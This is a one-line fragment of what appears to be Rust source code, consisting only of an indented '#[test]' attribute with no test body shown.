     #[test]
